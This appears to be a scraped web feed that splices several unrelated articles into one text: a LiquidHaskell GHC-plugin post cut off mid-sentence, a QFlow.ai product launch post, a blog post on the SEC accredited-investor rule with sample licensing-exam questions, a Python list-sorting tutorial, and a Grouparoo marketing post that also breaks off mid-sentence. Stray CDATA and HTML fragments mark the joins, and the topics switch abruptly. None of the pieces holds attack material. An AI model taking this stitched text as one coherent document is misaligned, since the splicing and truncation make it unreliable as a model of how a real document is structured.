<p>This post is intended as an extended cut of my <a href="https://icfp20.sigplan.org/details/hiw-2020-papers/1/Liquid-Haskell-as-a-GHC-Plugin">HIW talk</a>, and it nicely complements Ranjit’s more practical <a href="https://ucsd-progsys.github.io/liquidhaskell-blog/2020/08/20/lh-as-a-ghc-plugin.lhs/">blog post</a>. We won’t cover here what LiquidHaskell (<em>LH</em> for brevity) can bring to the table on top of GHC’s type-level programming, as there are plenty of resources out there to get you excited: we recommend starting from the <a href="https://ucsd-progsys.github.io/liquidhaskell-tutorial/">book</a> for a practical motivation on why LiquidHaskell even needs to exist. The official <a href="https://ucsd-progsys.github.io/liquidhaskell-blog">website</a> also covers a lot of material.</p>
<p>What we will do instead is to briefly recap how LH looks like, as well as presenting its internal architecture. After that, we will take a look at the old version of LH in order to understand its shortcomings, and how the plugin helped overcoming those. Last but not least we will explore the iterations of the various designs of our plugin.</p>
<h3 id="a-liquid-haskell-hello-world">A Liquid Haskell “hello world”</h3>
<p>If you have <em>never</em> seen how LiquidHaskell looks like in practice, let’s assume we want to check (i.e.&nbsp;<em>refine</em>) a Haskell module, say <code>A.hs</code>. The content of <code>A.hs</code> is not important, but as an example let’s suppose it to be:</p>
<div id="cb1"><pre><code><span id="cb1-1"><a href="#cb1-1"></a><span>module</span> <span>A</span> <span>where</span></span>
<span id="cb1-2"><a href="#cb1-2"></a></span>
<span id="cb1-3"><a href="#cb1-3"></a><span>import</span> <span>B</span></span>
<span id="cb1-4"><a href="#cb1-4"></a><span>import</span> <span>C</span></span>
<span id="cb1-5"><a href="#cb1-5"></a></span>
<span id="cb1-6"><a href="#cb1-6"></a><span>{-@ safeDiv :: Int -&gt; {y:Int | y /= 0 } -&gt; Int @-}</span></span>
<span id="cb1-7"><a href="#cb1-7"></a><span>safeDiv ::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span> <span>-&gt;</span> <span>Int</span></span>
<span id="cb1-8"><a href="#cb1-8"></a>safeDiv <span>=</span> <span>div</span></span></code></pre></div>
<p>The first line of the code block, which looks like a Haskell comment with additional <code>@</code>s, is a Liquid Haskell annotation. All Liquid Haskell instructions are written in special Haskell comments like this. This particular one assigns a refined type to <code>safeDiv</code>, and it’s essentially enforcing that the second <code>Int</code> we pass to <code>safeDiv</code> should <em>not</em> be 0. The <code>{y: Int | y /= 0}</code> also shows quite succinctly the essence of a <em>refinement type</em>, i.e.&nbsp;a type with a <strong>logical predicate</strong> attached to it. Now, if we try to attempt a division by 0, for example by calling <code>safeDiv 3 0</code>, LH would reject our program with a big red <code>UNSAFE</code> printed on screen, while if all is well a nice green <code>SAFE</code> would be shown.</p>
<p>Users can provide such annotations in a number of ways; they can annotate directly the Haskell source files, like in the example, or they can put all their refinements into a separate <code>.spec</code> file. Doing both <em>at the same time</em> (for the same module) is also supported, as LH will ensure that all these refinements will be merged into a single data structure, as we will see below.</p>
<h3 id="liquidhaskells-architecture">LiquidHaskell’s architecture</h3>
<p>Before deep-diving into any other section, let’s take a brief detour to explain how LH internally works, as it will help clarify some concepts later on. As usual, a picture is worth 1000 words:</p>

<p>Let’s break down this picture bit by bit. The first thing that LH does is to parse the annotations from the input file (<code>A.hs</code>) and from the companion <code>.spec</code> file (if any, thus the dashed lines in the picture), converting everything into a richer data structure known as a <code>BareSpec</code>. Think of the <code>BareSpec</code> as your input program, that has yet to be compiled: by this analogy, a <code>BareSpec</code> might still be ill-defined as it’s not yet being checked and verified by LH. Once a <code>BareSpec</code> gets verified by LH it becomes a <code>LiftedSpec</code>; the intuition behind the name is that the relevant Haskell types have been “lifted” into their <em>refined</em> counterparts.</p>
<p>Since <code>A.hs</code> imports some other modules, it has a number of <em>dependencies</em> that LH needs to track. The details are not important at this stage, as this dependency-tracking differs between the executable and the GHC Plugin, so let’s treat this process as a black box. The end result is a <code>HashSet</code> of <code>LiftedSpec</code>, where the use of <code>LiftedSpec</code> indicates that dependencies will have been verified (and lifted) by LH first.</p>
<p>The last piece of the puzzle is the list of <em>Core bindings</em> for <code>A.hs</code>. Core is GHC’s internal representation, with an AST that is smaller and easier to work with than the full source Haskell AST. LH desugars the program into Core, transforms it into <a href="https://en.wikipedia.org/wiki/A-normal_form">A-normal form</a>, then traverses it to generate a set of refinement constraints that must be solved to “lift” a <code>BareSpec</code> into a <code>LiftedSpec</code>. The key takeaway is that LH needs access to the <strong>Core bindings of the input program in order to work</strong>.</p>
<p>Finally, once we have everything we need, LH will apply a final transformation step to the input <code>{dependencies, coreBinds, bareSpec}</code>, producing two things as a result:</p>
<ol type="1">
<li>a <code>LiftedSpec</code>, which can now be serialised on disk and used as a dependency for other Haskell modules; and</li>
<li>a <code>TargetSpec</code>, which is the data structure LH uses to verify the soundness of <code>A.hs</code>.</li>
</ol>
<p>After creating the <code>TargetSpec</code> LH has to solve what is, effectively, a constraints problem: it generates a set of <a href="https://en.wikipedia.org/wiki/Horn_clause">Horn Clauses</a> from the <code>TargetSpec</code> and feeds them into an <a href="https://en.wikipedia.org/wiki/Satisfiability_modulo_theories">SMT solver</a>.<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a> If a solution is found, our program is <code>SAFE</code>, otherwise it is <code>UNSAFE</code>.</p>
<h3 id="the-old-status-quo">The old status quo</h3>
<p>Historically LH has been available only as a standalone executable, which had to be invoked on one or more target Haskell files in order to do its job. While this didn’t stop users from using it for <a href="https://skillsmatter.com/skillscasts/10690-keynote-scrap-your-bounds-checks-with-liquid-haskell">real world applications</a>, it somewhat limited its adoption, despite packages such as <a href="https://hackage.haskell.org/package/liquidhaskell-cabal">liquidhaskell-cabal</a> attempting to bridge the gap.</p>
<h5 id="compiling-haskell-code">Compiling Haskell code</h5>
<p>Now that we know how the kernel of LH works, understanding the executable and its limitations is not hard; in a nutshell, the executable used the <a href="https://hackage.haskell.org/package/ghc">GHC API</a> to accomplish all sorts of tasks: from <a href="https://github.com/ucsd-progsys/liquidhaskell/blob/v8.6.5-final/src/Language/Haskell/Liquid/GHC/Interface.hs#L237">dependency analysis</a> down to <a href="https://github.com/ucsd-progsys/liquidhaskell/blob/v8.6.5-final/src/Language/Haskell/Liquid/GHC/Interface.hs#L389">parsing</a>, <a href="https://github.com/ucsd-progsys/liquidhaskell/blob/v8.6.5-final/src/Language/Haskell/Liquid/GHC/Interface.hs#L391">typechecking</a> and <a href="https://github.com/ucsd-progsys/liquidhaskell/blob/v8.6.5-final/src/Language/Haskell/Liquid/GHC/Interface.hs#L467">desugaring</a> the input module. Astute readers might argue that <strong>this is replicating what GHC normally does</strong>, and they would be correct! One of the main shortcomings of the old executable was indeed that there was very little or no integration into GHC’s compilation pipeline.</p>
<h5 id="writing-and-distributing-specifications">Writing and distributing specifications</h5>
<p>As we have seen already, LH checks each and every refinement it can find while parsing an input Haskell module, which means that the more refinements we have, the more useful LH will be at spotting bugs and mistakes. However, this also means that <em>somehow</em> we need to have a way to <strong>write and distribute</strong> specifications for <em>existing</em> Haskell types, functions and even packages, as users would not like to be obliged to define refinements for basic things like <code>+</code> or natural numbers.</p>
<p>The LiquidHaskell HQ stoically solved this problem by shipping a “hardcoded” prelude as part of the executable, that contained specifications for some types in <code>base</code> and for some preeminent Haskell packages like <code>containers</code>, <code>bytestring</code> etc. While this worked, it wasn’t very <strong>flexible</strong>, as it was a “closed” environment: new specifications couldn’t be added without releasing a new version of LH, not to talk about tracking breaking changes to the relevant upstream packages. To say it differently, the hardcoded prelude made a best effort to be compatible with such Haskell packages, but it couldn’t guarantee that newer releases of, say, <code>bytestring</code>, wouldn’t break the specifications making LH compatible with <code>bytestring-x.x.x.x</code> but not <code>bytestring-x.x.y.y</code>.</p>
<h5 id="ide-support">IDE support</h5>
<p>With LH available as an executable, there was little hope to integrate it with things like <code>ghcide</code>, <code>ghcid</code> or even <code>ghci</code>. IDE support was added in an ad-hoc fashion by providing the executable with a <code>--json</code> flag that could be used to output the result of the refinement (including errors) in a JSON format. One could then write wrappers around it to turn such JSON into formats editors or LSP servers could understand. A notable mention goes here to Alan Zimmerman, who added a <a href="https://github.com/haskell/haskell-ide-engine/blob/master/src/Haskell/Ide/Engine/Plugin/Liquid.hs">haskell-ide-engine plugin</a> for LH using the limited <code>--json</code> interface, nevertheless creating a very pleasant IDE experience.</p>
<h3 id="the-new-way">The new way</h3>
<p>Starting from version <a href="https://hackage.haskell.org/package/liquidhaskell-0.8.10.1/docs/Language-Haskell-Liquid-GHC-Plugin-Tutorial.html">0.8.10.1</a>, LH is available as a <a href="https://hackage.haskell.org/package/ghc-8.10.1/docs/Plugins.html">GHC Plugin</a>, which means that integrating it into your project is as easy as adding an extra <code>-fplugin=LiquidHaskell</code> to the list of <code>ghc-options</code> in your <code>.cabal</code> file, and adding <code>liquidhaskell</code> and <code>liquid-base</code> to its dependencies. In the rest of this post we will discuss the design of this plugin, as it ended up being outside the conventional boundaries of what it can be defined a “standard” plugin, for reasons which will become obvious later on.</p>
<h3 id="a-ghc-plugin-quick-recap">A GHC Plugin quick recap</h3>
<p>Before discussing the plugin’s design, let’s quickly recap how a GHC Plugin works, starting, as always, from a picture:</p>
<p><img src="http://www.well-typed.com/blog/aux/images/alfredo/lh-as-a-ghc-plugin/plugin_architecture.png"></p>
<p>At its core, a Plugin is simply a Haskell data record where record fields expose customisable actions that can modify most of GHC’s pipeline stages. Let’s take for example <code>parsedResultAction</code>:</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>parsedResultAction ::</span> [<span>CommandLineOption</span>] <span>-&gt;</span> <span>ModSummary</span> <span>-&gt;</span> <span>HsParsedModule</span> <span>-&gt;</span> <span>Hsc</span> <span>HsParsedModule</span></span></code></pre></div>
<p>The documentation states that it will “Modify the module when it is parsed. This is called by HscMain when the parsing is successful.”. This means that we can write a simple Haskell function that takes as input a <code>HsParsedModule</code> and it has to produce a <em>new</em> <code>HsParsedModule</code>, effectively allowing us to modify how the GHC pipeline behaves. Similarly, <code>typecheckResultAction</code> is called after typechecking has ended, while <code>installCoreToDos</code> allows us to add extra optimizations and transformations on the Core representation of the program. This is for example how <a href="https://hackage.haskell.org/package/inspection-testing">inspection-testing</a> performs its magic, by grabbing the Core bindings at this stage.</p>
<h3 id="the-general-design-idea">The general design idea</h3>
<p>There is a <em>fil rouge</em> in all the different iterations of the plugin, namely the idea that a <code>LiftedSpec</code> should be serialised into the <strong>interface file</strong> of the associated …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>With QFlow.ai coming out of beta, I wanted to share a bit about what QFlow.ai is and does, but also try to answer the question: why build QFlow.ai?</p>
<p>Let’s begin with the problem. Both I and my co-founder have spent years in executive
positions (CFO, VP Finance, VP Operations, VP Marketing, etc.) at B2B companies. At each company, between sales,
marketing, customer success, and finance, <strong>we had a lot of tools generating a lot of data</strong>. But our organizations were by and large
stuck with outdated tools and skills to analyze that data.</p>
<p>Content Launchpad</p>
<ul>

<li><a href="#different-qflow-ai-plans">What differentiates plans?</a></li>
<li><a href="#what-is-next-for-qflow-ai">What’s next?</a></li>
</ul>
<p><img src="https://blog.qflow.ai/images/DataSources.gif" alt="Lots of data, not much information"></p>
<h2 id="deceivingly-simple-but-important-questions-are-notoriously-difficult-to-answer-for-b2b-sales--marketing-professionals">Deceivingly simple but important questions are notoriously difficult to answer for B2B sales &amp; marketing professionals</h2>
<p>Often the simplest of questions that we ask of our data are difficult to answer reliably,
accurately, and efficiently. Some examples include:</p>
<ul>
<li>What does the customer acquisition journey look like, from marketing, to sales, to customer success?</li>
<li>What programs, marketing campaigns, and sales tools are yielding the best outcomes? What about relative to cost?</li>
<li>How much time is it taking for our sales reps to follow up on an inbound lead?</li>
<li>What happened to the opportunities that made up the $XX million dollars in last month’s sales forecast?</li>
<li>What types of outbound sales activities are yielding productive vs. unproductive outcomes? Which sales behaviors can we model our playbook around?</li>
<li>How can we more accurately predict conversions? How can we more accurately forecast renewals?</li>
<li>Can we fix lead scoring and build trust between sales and marketing?</li>
</ul>
<h2 id="to-properly-analyze-a-b2b-business-a-data-warehouse-is-required-but-alone-is-insufficient">To properly analyze a B2B business, a data warehouse is required but alone is insufficient</h2>
<p>Addressing these questions with intellectual honesty turned out to be a slippery slope.
If we got engineering to stand up a data warehouse, we would then require a data engineering resource. If we got a data engineering resource, we
would then have to compete for her/his time and attention with more interesting projects.</p>
<p>And, even if we successfully had convinced a capable data engineer to help us maintain the data warehouse, that was just the
beginning. <strong>We would <em>still</em> need</strong>:</p>
<ul>
<li>heavy lifting in terms of data transformation, far beyond the capabilities of SQL</li>
<li>to overcome disagreements / the lack of belief in marketing attribution models</li>
<li>to get stakeholders onboard across sales, marketing, finance, customer success, etc.</li>
<li>analysts to partner with data engineers, <strong>so we could derive <em>useful information</em> from the data</strong></li>
</ul>
<p>In short, we had data, but found that too often it resulted in little useful information. Managing our business meant we needed to <strong>discard
“intuition” and embrace complex data</strong>, which in turn meant upgrading our organization’s tool set and skill set.
This simply wasn’t feasible most of the time.</p>
<p>So we built QFlow.ai. Because B2B customer-facing teams deserve to use a modern data toolset and its benefits.</p>
<h2 id="what-is-qflow-ai">What is QFlow.ai?</h2>
<p>QFlow.ai is a platform that enables B2B businesses to adopt machine learning, embrace complexity, and quickly answer the
questions that matter most. It works not by generating more data, but by using the <strong>data that you already have from</strong>:</p>
<ul>
<li>Salesforce.com (standard objects)</li>
<li>Your marketing automation platform (Marketo, Hubspot, Pardot, etc.)</li>
<li>Commonly used marketing platforms (e.g., Google Ads)</li>
<li>Optionally, any custom data that would be relevant to a machine learning model (more on that later)</li>
</ul>
<p>We built QFlow.ai specifically to capture the data needed to engineer a time series based dataset, with
an abstraction layer that sits on top and addresses idiosyncratic implementations of Salesforce.com.</p>
<p>If you’re familiar with idiosyncratic business systems implementation, you might understandably have raised an eyebrow just now.</p>
<p>With the understanding each company is different, we built an account setup process that addresses differences in and
builds on  similarities in implementations. It works so well
that we’ve patented it.</p>
<p><img src="https://blog.qflow.ai/images/qflow-ai-setup-wizard.png" alt="Simple setup abstracts away complexity"></p>
<p>Rather than spending days, weeks, or months setting up marketing attribution, our beta customers start getting value out of
QFlow.ai over the course of an early afternoon.</p>
<h2 id="how-does-qflowai-work">How does QFlow.ai work?</h2>
<p>Let’s address how QFlow.ai works at a high level.</p>
<ul>
<li>First, QFlow.ai creates a secure data warehouse for you and you alone — into which it pulls your corporate data</li>
<li>It uses existing data in your CRM and marketing platform to generate data visualizations and power machine learning recipes (more on that later)</li>
<li>It then re-assembles standard and, optionally, custom data to a format amenable to machine learning</li>
<li>And it works out of the box, requiring mere minutes of configuration — not days or months of setup / professional services
<img src="https://blog.qflow.ai/images/QFlow-Platform-Overview-Aug-2020.png" alt="QFlow Platform Basics"></li>
</ul>
<h2 id="what-does-qflow-ai-do">What are the capabilities of QFlow.ai?</h2>
<p>As of August 2020, the Standard Plan QFlow.ai includes the following major features:</p>
<table>
<thead>

<h2 id="different-qflow-ai-plans">What differentiates QFlow.ai Standard from QFlow Pro? (Machine Learning Recipes)</h2>
<p>Originally, we planned on much more differentiation. But at the onset of the COVID-19 pandemic, we made a decision to shove as much functionality as
possible into the QFlow.ai standard plan at a very low-friction price  ($699/mo paid annually, $899/mo paid monthly).</p>
<p>The primary difference between the two plans today is that <a href="https://qflow.ai/products/machine-learning">Machine Learning Recipes</a>
are available in Pro. This is not “machine learning” in a box. Instead, we’ve developed templates for machine learning
models that address common use cases in B2B. These templates are building blocks that, when deployed, are trained
and tuned machine learning models. <strong>We call these pre-built templates Machine Learning (ML) Recipes.</strong></p>
<p>Our two most popular Machine Learning recipes address <strong>lead scoring</strong> and <strong>opportunity scoring</strong>.</p>
<p>A typical Machine Learning recipe relies on standard information gleaned from your Salesforce.com and marketing platform integration,
but all recipes in our library can ingest <strong>custom data</strong> (e.g., product usage data, # API calls, seat utilization).</p>
<p>The inferred results from your ML jobs are available both on the QFlow.ai platform
and in your Salesforce.com instance. This way, your employees are able to orient their workday more intelligently without disruption.</p>
<p><img src="https://blog.qflow.ai/images/p-convert-ml-recipe-process.png" alt="QFlow.ai Lead Scoring ML Recipe "></p>
<h2 id="what-is-next-for-qflow-ai">What’s on the roadmap for QFlow.ai</h2>
<p>We have built a lot in 9 short months, but there remains a lot to build. If you are a capable data scientist, devops
engineer, marketing or sales professional, or have a skill set that offers a unique contribution to our journey, we’re
interested in talking with you about a fulfilling job.</p>
<p><strong>It’s been humbling to see our earliest customers use QFlow.ai transform the way that they approach generating and retaining B2B revenue
in a cost-effective way.</strong> During our limited private beta, QFlow.ai generated insights for customers that saved hundreds of thousands
of dollars in ineffective spend, increased forecastable pipeline for sales team by 2.4x, and measurably
worked to get marketing, sales, and finance teams on the same page.</p>
<p>So, what’s next? More building, more listening. An occasional blog post to try to let you know what we’re up to.
And a couple dedicated features for Customer Success teams to complement our ML recipe that predicts and helps mitigate churn.</p>
<p>When you’re ready to join us on this journey, let us know by <a href="https://qflow.ai/contact-us">scheduling a time for a demo</a>.
Until then, we’ll be hard at work.</p>

<![CDATA[Knowledge-based accreditation, a boon to small hedge funds]]>

August 28, 2020 | http://www.regressionist.com/2020/08/28/knowledge-based-accreditation-a-boon-to-small-hedge-funds/ | <a href="https://web.archive.org/web/*/http://www.regressionist.com/2020/08/28/knowledge-based-accreditation-a-boon-to-small-hedge-funds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>The SEC announced on Wednesday that they are <a href="https://www.sec.gov/news/press-release/2020-191">modernizing the accredited investor definition</a>. They’ve added an exception to the income/net-worth rule for investors with professional knowledge and experience. This is good news!</p>



<h2>Traditional hedge fund offerings</h2>



<p>Hedge funds typically raise money through Reg D, 506(b), which directs offers to invest only to accredited investors. Accredited investors include individuals with a net worth of at least $1 million, not including the value of their primary residence. Also included are individuals with an annual income of at least $200k ($300k if combined with spouse) for the prior two years and with a reasonable expectation of the same or greater income in the current year. Hedge funds marketing to such individuals might ask for past tax forms, or have a third party (CPA or attorney) represent that the investor is accredited.</p>



<p>Now with this change, the scope of accreditation is being expanded to sophisticated individual investors who understand the law and the investment risks involved. Concretely, now included are holders in good standing of the Series 7, Series 65, and Series 82 licenses. Additional certifications, designations, or credentials may be added in the future.</p>



<h2>This may help small hedge funds</h2>



<p>This change will not make a difference for large hedge funds. They are not marketing to people with low net worth, regardless of sophistication. In fact, to the extent they target individuals at all, most hedge funds actually raise money only from <em>qualified purchasers</em>, who have at least $5 million in investments. And the minimum investment amount can be very high. Here are some examples from hedge fund offerings reported on <a href="https://www.sec.gov/dera/data/form-d">SEC Form D for 2020 Q2</a>:</p>



<figure><table><thead><tr><th>Fund offering</th><th>Minimum investment</th></tr></thead><tbody><tr><td>Newport Patriot LLC</td><td>$325,000,000</td></tr><tr><td>Winton Rio Grande Fund LP</td><td>$200,000,000</td></tr><tr><td>Atlas Institutional Equity Fund, L.P.</td><td>$150,000,000</td></tr><tr><td>ERS Launchpad, LLC</td><td>$150,000,000</td></tr><tr><td>Morris Island Partners, L.P.</td><td>$100,000,000</td></tr><tr><td>CMAP SRPA Fund Ltd</td><td>$50,000,000</td></tr><tr><td>CC ARB West, LLC</td><td>$50,000,000</td></tr><tr><td>Blue Isles Futures Fund Ltd.</td><td>$40,000,000</td></tr><tr><td>ABRAMS BISON PARTNERS, LP</td><td>$25,000,000</td></tr><tr><td>Darsana Fund LP</td><td>$20,000,000</td></tr><tr><td>Four Pines Onshore Fund LP</td><td>$10,000,000</td></tr><tr><td>Squarepoint Core International Feeder Ltd</td><td>$10,000,000</td></tr><tr><td>Verdad Opportunity Fund I, LP</td><td>$10,000,000</td></tr><tr><td>Think India Opportunities Fund LP</td><td>$10,000,000</td></tr><tr><td>Orion Commodities Delaware Fund LP</td><td>$10,000,000</td></tr></tbody></table></figure>



<p>So, as far as hedge funds are concerned, this change is only interesting to low-capacity funds that would consider taking small investments.</p>



<h2>Series 7</h2>



<p>The Series 7 exam is for broker-dealers. It has a prerequisite – the Securities Industry Essentials exam. Also, you must be sponsored by a member firm to take the exam. Here is an example question:</p>



<blockquote><p>Convertible bonds have all of the following features except:<br>    A. an ability to protect a short position on the stock into which they are convertible<br>    B. permissibility for use as collateral<br>    C. a normally higher yield than non-convertible bonds of the same issuer<br>    D. fluctuations influenced by changes in the price of the underlying common stock</p></blockquote>



<h2>Series 82</h2>



<p>The Series 82 exam is for conducting private securities offerings. It has the same Securities Industry Essentials exam prerequisite and sponsoring requirement. Here is an example question:</p>



<blockquote><p>When must checks to purchase securities in a contingency offering be delivered to the escrow agent?<br>    A. By noon the next business day<br>    B. Immediately<br>    C. Within 2 business days<br>    D. Within 3 business days</p></blockquote>



<h2>Series 65</h2>



<p>The Series 65 exam is for becoming an investment advisor. One does <em>not</em> need to be sponsored to take this exam. Here is an example question:</p>



<blockquote><p>XYA a manufacturer of computer circuit boards has $50,000,000 worth of subordinated debentures outstanding. Each debenture carries an interest rate of 6.5% and has warrants attached to the debenture to purchase 5 shares of XYA at $25 per share. XYA’s stock is trading in the market place at $28 per share and the warrants are about to expire. How many new shares can XYA reasonably expect to issue?<br>    A. 50,000<br>    B. 250,000<br>    C. 500,000<br>    D. 25,000</p></blockquote>



<h2>Conclusion</h2>



<p>As my intention is to start a small hedge fund, this change to the definition of accreditation can only help. Also, since I intend to take the Series 65 exam anyway, this will give me the added benefit of (myself) being an accredited investor no matter what income fluctuations come in the next few years without a job.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <p>In this tutorial, you will learn how to sort a list in Python, by following the below three steps:</p> <ol><li>Options to sort a list in Python<ul><li>What is the difference between “sort” and “sorted”</li><li>An example of using “sort”</li><li>An example of using “sorted”</li></ul></li><li>How to Sort a List in Reverse<ul><li>Sort a list in Reverse using “sort”</li><li>Sort a list in Reverse using “sorted”</li></ul></li><li>Sort with a Custom Function using Key</li></ol> <h2>1. Options to sort a list in Python</h2> <p>There exist two main options, those are <code>sort()</code> and <code>sorted()</code>, let’s explore them below.</p> <h3>What is the difference between “sort” and “sorted”</h3> <p><code>list.sort()</code> changes the list in place and returns <code>None</code>.</p> <p><code>sorted()</code> takes an iterable and returns a new list, sorted.</p> <h3>An example of using “sort”</h3> <pre title=""># create a list of unordered items
our_list = ["f", "a", "c", "z", "b"]

# sort the list
new_list = our_list.sort()

# print the new list
print(new_list)
# result: None

print(our_list)
# result: ['a', 'b', 'c', 'f', 'z']
</pre> <p>Notice how it changes the list itself, but does not return a value to be placed into a new variable.</p> <h3>An example of using “sorted”</h3> <pre title=""># create a list of unordered items
our_list = ["f", "a", "c", "z", "b"]

# sort the list
new_list = sorted(our_list)

# print the new list
print(new_list)

# result: ['a', 'b', 'c', 'f', 'z']
</pre> <p>Notice how the changes are saved to the new list/variable.</p> <h2>2. How to Sort a List in Reverse</h2> <p>Using the above functions, it’s simple to sort a list in reverse. Just specify the <code>reverse</code> argument and set it to <code>True</code>.</p> <h3>Sort a List in Reverse using “sort”</h3> <pre title=""># create a list of unordered items
our_list = ["f", "a", "c", "z", "b"]

# sort the list
new_list = our_list.sort(reverse=True)

print(our_list)
# result: ['z', 'f', 'c', 'b', 'a']
</pre> <h3>Sort a List in Reverse using “sorted”</h3> <pre title=""># create a list of unordered items
our_list = ["f", "a", "c", "z", "b"]

# sort the list
new_list = sorted(our_list, reverse=True)

# print the new list
print(new_list)

# result: ['z', 'f', 'c', 'b', 'a']
</pre> <h2>3. Sort with a Custom Function using Key</h2> <p>It is also possible to implement your own sorting method. This is done by adding a <code>key</code> parameter and setting it to a method.</p>  <p>For example:</p> <pre title=""># create a list of different length items
our_list = ["fasd", "asstt", "cqasf", "zqfwsef", "ba"]

# sort the list, by `len`
new_list = sorted(our_list, key=len)

# print the new list
print(new_list)

# result: ['ba', 'fasd', 'asstt', 'cqasf', 'zqfwsef']
</pre> <p>Just as we used <code>sorted</code> here, you could also have used <code>list.sort</code> as follows:</p> <pre title="">our_list.sort(key=len)
</pre> <p>As before, you can also combine the <code>reverse=True</code> argument should you want the reverse order.</p> <pre title="">our_list.sort(key=len, reverse=True)

# or

sorted(our_list, key=len, reverse=True)
</pre> <p>You could also swap out the use of the <code>len</code> method as the custom <code>key</code> with your own function, or lambda, to sort by some custom choice.</p> <p>For example:</p>  <pre title="">student_tuples = [('john', 'A', 15),('jane', 'B', 12),('dave', 'B', 10),]
sorted(student_tuples, key=lambda student: student[2]) 

# result: [('dave', 'B', 10), ('jane', 'B', 12), ('john', 'A', 15)]
</pre> <p>Or in another example:</p> <pre title="">lst = [('candy','30','100'), ('apple','10','200'), ('baby','20','300')]
lst.sort(key=lambda x:x[1])
print(lst)

# result: [('apple', '10', '200'), ('baby', '20', '300'), ('candy', '30', '100')]
</pre>  </div></div>]]>

<![CDATA[Pull the Data you Actually Want – Why Events are an overused model]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blogContent"><p><img alt="Pull doughnuts" src="https://www.grouparoo.com/_next/static/images/doughnuts-90d02f03fc3e2d5704ed88886a47f9df.jpg"></p><p>There’s an underlying pattern prevalent today in many digital marketing tools that is causing problems. Wasted time, overpaying, slow velocity, and privacy issues for your customers are some of the results of this pattern. The problem is the over-reliance on Events. Specifically, the problem is that many marketing tools live in a world where they expect to be “pushed” data, when it would be so much better if they were “pulling” data when they needed it.</p><p>In this blog post, we’ll explore the problems with event-based “Push” marketing &amp; analytics tools, and how we can fix them by switching to a “Pull” based solution, like the one that <a href="https://github.com/grouparoo/grouparoo">Grouparoo</a> is building.</p><h2>The Problems with “Push” and Events</h2><p>We have conducted interviews with over 70 marketing teams of all sizes throughout the world. What follows is a synthesis of some of the common problems they face with their current marketing tools.</p><h3>Overpaying</h3><p>One of the most telling critiques of event-based SaaS marketing tools is the fact that marketing teams are /actively/ pruning the events they are sending to control costs. Tools like Segment work best when you can build a robust profile of your customers' activity, but Segment charges you more when you store more data! Segment essentially holds their functionality hostage as you gain more users who in turn produce more events. Countless marketers lamented pain of having to decide which events to keep tracking versus which to stop tracking. Inevitably, a new campaign idea would hit them a few months later that would need the event that they stopped tracking. These teams and marketers just didn’t have the money to keep sending every event. This takes us to the Stale Data problem.</p><h3>Stale Data</h3><p>When using only events to model your customers, there’s a huge lag time between when you start capturing that data and when you can use it. For example, say you want to run a campaign targeting customers who haven’t purchased in 6 months. If you start sending <code>purchase</code> events in June, the soonest you can start your campaign is December. Not only is that a long time to wait, but you’ve also sacrificed your team’s agility to modify those events or the campaign while you wait, <a href="https://www.grouparoo.com/blog/the-shots-you-get-to-take">minimizing the shots you get to take</a>.</p><h3>Lost History</h3><p>In addition to the slow ramp up time for a new campaign based on events, there’s the problem of lost events. With poor mobile connections, errors on your web pages &amp; apps, slow vendors, and increasingly prevalent ad-blocking tools, it’s very easy to lose an event. Every marketer we talked to had their own less-than-scientific process they used to explain discrepancies between events and product data. Everyone had a different process and no one really trusted an event-based data source. If events are the only way you model your customers, it can be devastating if you miss a <code>changed-email-address</code> event - you might never be able to reach your customers at all!</p><p>Coupling this issue with the Stale Data problem, there’s no way to fully model customers you had before you started sending events. There’s no way to compare the profile you’ve built in Segment against your product database, where the customer’s data is actually stored with confidence.</p><h3>Privacy Nightmare</h3><p>Finally, there’s a challenging privacy story regarding events. You have a relationship with your customers and part of that relationship is based on trust. How sure are you that Segment or Mixpanel is storing your customers' data safely? How many other services do your events pass though on the way to them? Google Analytics or Google Tag Manager? AdMob? Facebook or Twitter Pixels? The list goes on and on. Any one of these vendors is a potential vector for attack, event theft, or event manipulation.</p><p>With regulations like GDPR and CCPA and many more on the way, you have a clear legal responsibility to keep your customers' data safe. Part of that responsibility is ensuring that the companies you share data with will update, delete, and anonymize data when <em>you</em> ask them too. What’s your process for doing that for all of your past events?</p><h2>The future is "Pull"</h2><p>How would you build things if you were starting today? We would focus on pulling in data from our existing sources, of course!</p><p>Now, imagine you were starting to build a new marketing tool from scratch, like <a href="https://www.grouparoo.com/">Grouparoo</a> is. You aren’t burdened by the poor legacy choices of Segment, Mixpanel, and the rest. How would you build things if you were starting today? We would focus on pulling in data from our existing data sources. With Grouparoo, events are a way to augment your customer profiles, not the main source of critical data.</p><p>Grouparoo’s goal is to make it easy for non-technical members of your team to build robust customer profiles and groups. Then, they can synchronize that data in a safe way to communication and advertising partners. A highly-functioning digital marketing team can quickly add new profile properties, augment them with data from your product and data warehouse(s), and start running a new campaign in minutes, rather than weeks.</p><h3>Within your Firewall</h3><p>To be in the best position to pull in data, the Grouparoo application should be located within your company firewall. This means that Grouparoo should run on <em>your</em> servers and have (read) access to your databases. In this way, no data ever leaves your company’s control, and you can always inspect, audit, and change it. You don’t need to send your customer data over the open internet to a third party just to build a new cohort.</p><h3>Safe and Secure</h3><p>Since your customer data lives where it belongs on your servers, you can make changes and deletions as needed, and you can prove it. You can build a transparent GDPR/CCPA process at your company with Grouparoo. Grouparoo has robust access controls and logs to ensure that every profile and group is managed the way it should be.</p><h3>Cost Controls</h3><p>Since Grouparoo is running on your servers, there’s no additional cost to import more data. If you want to add more properties to your customer profiles to build more fine-grained groups and cohorts, then do it! Have you imported a facet you no longer need? Delete it! Grouparoo doesn't charge per event, or any other measure of data quantity, so you are free to experiment at will.</p><h3>Always up-to-date</h3><p>The “Pull” pattern has a wonderful property; Grouparoo can check up on the data whenever we are about to use it! This means that rather than waiting for an event to (possibly) be sent to Grouparoo to update a customer’s preferences or LTV, we can ask the primary source. Grouparoo will always re-import the properties of every profile before sending a communication to the customer, or syncing with a third party. This means that you can be sure that you’ll always be working with the latest customer preferences, purchase, email address, names, etc. when communicating with them. No lost events will prevent you from communicating effectively.</p><h3>Ready for ad-blocking technology by respecting consumer choices</h3><p>Finally, the pattern of tracking and sending <strong>so many</strong> events from our sites and applications 